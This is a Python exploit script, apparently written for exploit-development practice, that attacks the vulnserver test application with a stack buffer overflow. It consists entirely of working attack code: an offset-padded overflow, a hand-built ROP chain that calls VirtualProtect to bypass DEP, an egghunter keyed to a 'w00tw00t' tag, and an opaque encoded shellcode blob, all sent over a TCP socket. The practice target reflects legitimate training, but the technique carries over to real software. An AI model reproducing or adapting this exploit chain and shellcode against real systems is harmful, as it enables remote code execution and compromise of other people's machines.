import struct
import socket


def shellcode():
    buf =  b"w00tw00t"
    buf +=  b"\x90" * 10
    buf += b"\xbe\x07\xf9\x74\x45\xd9\xe5\xd9\x74\x24\xf4\x5f"
    buf += b"\x33\xc9\xb1\x52\x83\xc7\x04\x31\x77\x0e\x03\x70"
    buf += b"\xf7\x96\xb0\x82\xef\xd5\x3b\x7a\xf0\xb9\xb2\x9f"
    buf += b"\xc1\xf9\xa1\xd4\x72\xca\xa2\xb8\x7e\xa1\xe7\x28"
    buf += b"\xf4\xc7\x2f\x5f\xbd\x62\x16\x6e\x3e\xde\x6a\xf1"
    buf += b"\xbc\x1d\xbf\xd1\xfd\xed\xb2\x10\x39\x13\x3e\x40"
    buf += b"\x92\x5f\xed\x74\x97\x2a\x2e\xff\xeb\xbb\x36\x1c"
    buf += b"\xbb\xba\x17\xb3\xb7\xe4\xb7\x32\x1b\x9d\xf1\x2c"
    buf += b"\x78\x98\x48\xc7\x4a\x56\x4b\x01\x83\x97\xe0\x6c"
    buf += b"\x2b\x6a\xf8\xa9\x8c\x95\x8f\xc3\xee\x28\x88\x10"
    buf += b"\x8c\xf6\x1d\x82\x36\x7c\x85\x6e\xc6\x51\x50\xe5"
    buf += b"\xc4\x1e\x16\xa1\xc8\xa1\xfb\xda\xf5\x2a\xfa\x0c"
    buf += b"\x7c\x68\xd9\x88\x24\x2a\x40\x89\x80\x9d\x7d\xc9"
    buf += b"\x6a\x41\xd8\x82\x87\x96\x51\xc9\xcf\x5b\x58\xf1"
    buf += b"\x0f\xf4\xeb\x82\x3d\x5b\x40\x0c\x0e\x14\x4e\xcb"
    buf += b"\x71\x0f\x36\x43\x8c\xb0\x47\x4a\x4b\xe4\x17\xe4"
    buf += b"\x7a\x85\xf3\xf4\x83\x50\x53\xa4\x2b\x0b\x14\x14"
    buf += b"\x8c\xfb\xfc\x7e\x03\x23\x1c\x81\xc9\x4c\xb7\x78"
    buf += b"\x9a\xb2\xe0\xaf\xfd\x5b\xf3\xaf\x10\xc0\x7a\x49"
    buf += b"\x78\xe8\x2a\xc2\x15\x91\x76\x98\x84\x5e\xad\xe5"
    buf += b"\x87\xd5\x42\x1a\x49\x1e\x2e\x08\x3e\xee\x65\x72"
    buf += b"\xe9\xf1\x53\x1a\x75\x63\x38\xda\xf0\x98\x97\x8d"
    buf += b"\x55\x6e\xee\x5b\x48\xc9\x58\x79\x91\x8f\xa3\x39"
    buf += b"\x4e\x6c\x2d\xc0\x03\xc8\x09\xd2\xdd\xd1\x15\x86"
    buf += b"\xb1\x87\xc3\x70\x74\x7e\xa2\x2a\x2e\x2d\x6c\xba"
    buf += b"\xb7\x1d\xaf\xbc\xb7\x4b\x59\x20\x09\x22\x1c\x5f"
    buf += b"\xa6\xa2\xa8\x18\xda\x52\x56\xf3\x5e\x72\xb5\xd1"
    buf += b"\xaa\x1b\x60\xb0\x16\x46\x93\x6f\x54\x7f\x10\x85"
    buf += b"\x25\x84\x08\xec\x20\xc0\x8e\x1d\x59\x59\x7b\x21"
    buf += b"\xce\x5a\xae"

    return buf


#\x00\x0A\x0D

IAT = 0x69aa7ea4 # (VirtualProtectStub IAT entry)

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888
target = (TARGET_IP, TARGET_PORT)  # vulnserver


crash = 2000  # change me
offset = 1052

va = b""
va += struct.pack("<L", 0x45454545)                # VirtualProtect address
va += struct.pack("<L", 0x46464646)                # shellcode return address to return to after VirtualProtect is called
va += struct.pack("<L", 0x47474747)                # lpAddress (same as above)
va += struct.pack("<L", 0x48484848)                # dwSize         (size of shellcode, 0x300 or so)
va += struct.pack("<L", 0x49494949)                # flNewProtect   (0x40)
va += struct.pack("<L", 0x61f8c004)                # lpflOldProtect (some writable memory address)

buffer = b""

gadgets = [
    # align ebx start of the va
    0x61e63999, # inc ebx ; ret  ;
    0x61e63999, # inc ebx ; ret  ;
    0x61e63999, # inc ebx ; ret  ;
    0x61e63999, # inc ebx ; ret  ;

    0x61e63999, # inc ebx ; ret  ;
    0x61e63999, # inc ebx ; ret  ;
    0x61e63999, # inc ebx ; ret  ;
    0x61e63999, # inc ebx ; ret  ;

    0x61e63999, # inc ebx ; ret  ;
    
    # put virtualprotect address

    0x61b612db, # pop eax ; ret  ;
    IAT,
    0x61bb8cb3, # mov eax, dword [eax] ; ret  ;
    0x61b99285, # mov dword [ebx], eax ; mov eax, ebx ; pop ebx ; ret  ;
    0x41414141, # dummy for pop ebx

    # put return address ( current pointer + 0x100)
    0x61b7e11c, # add eax, 0x04 ; ret  ;

    0x61be6142, # xor edx, edx ; ret  ;
    0x61d76f2f, # add edx, eax ; add al, 0x00 ; retn 0x0004 ;
    0x61b41011, # ret  ;  ROPNOP
    0x41414141, # retn 0x0004 ;

    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61b7e3ec, # add eax, 0x10 ; ret  ;

    0x61f2b0b3, # mov dword [edx], eax ; ret  ;

    # put lpAddress

    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;

    0x61f2b0b3, # mov dword [edx], eax ; ret  ;

    # put dwSize

    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;

    0x61b79120, # xor eax, eax ; ret  ;

    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;

    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;

    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61bd89f7, # add eax, 0x40 ; ret  ;

    0x61f2b0b3, # mov dword [edx], eax ; ret  ;

    # put flNewProtect
    
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;
    0x61b455fa, # inc edx ; ret  ;

    0x61b79120, # xor eax, eax ; ret  ;

    0x61bd89f7, # add eax, 0x40 ; ret  ;
    0x61f2b0b3, # mov dword [edx], eax ; ret  ;

    # mov esp

    # edx - 0x14 --> ebp
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;

    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;

    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;

    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;

    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;
    0x61e1f701, # dec edx ; add al, 0x83 ; ret  ;

    0x61dcffca, # xchg eax, edx ; ret  ;
    0x61c17257, # xchg eax, ebp ; ret  ; 
    0x61b4157d, # leave  ; ret  ;
]

for gadget in gadgets:
    buffer += struct.pack("<L", gadget)

def egghunter():
    egghunter = b"\x90" * 10
    egghunter += b"\x31\xd2\x66\x81\xca\xff\x0f\x42\x52\xb8\x3a\xfe"
    egghunter += b"\xff\xff\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xeb\xb8"
    egghunter += b"\x77\x30\x30\x74\x89\xd7\xaf\x75\xe6\xaf\x75\xe3"
    egghunter += b"\x68\x08\xc0\xf8\x61\x31\xc0\xb0\x40\x50\xb8\xfc"
    egghunter += b"\xfb\xff\xff\xf7\xd8\x50\x57\x57\xba\xa4\x7e\xaa"
    egghunter += b"\x69\x8b\x02\x50\xc3"

    return egghunter

payload = b""
payload += b"A"*(offset - len(payload))
payload += struct.pack("<L", 0x61b9eab6) # push esp ; pop ebx ; pop esi ; ret  ;
payload += struct.pack("<L", 0x41414141) # dummy for pop esi
payload += struct.pack("<L", 0x61b79163) # add esp, 0x1C ; ret  ;
payload += va
payload += buffer
payload += egghunter()
payload += shellcode()
payload += b"C"*(crash - len(payload))

with socket.create_connection(target) as sock:

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
